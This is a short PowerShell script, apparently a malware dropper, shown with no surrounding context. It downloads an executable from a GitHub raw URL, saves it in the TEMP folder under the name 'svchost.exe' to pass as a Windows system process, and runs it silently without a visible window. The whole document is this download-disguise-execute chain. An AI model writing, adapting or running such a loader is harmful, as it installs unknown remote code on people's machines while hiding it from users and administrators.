$link1 = "https://github.com/nowrez/zelenkovcode/raw/main/X.exe"
$outfile1 = "$env:TEMP\svchost.exe"
Invoke-WebRequest -Uri "$link1" -OutFile "$outfile1"
Start-Process -Wait -NoNewWindow -FilePath "$outfile1"
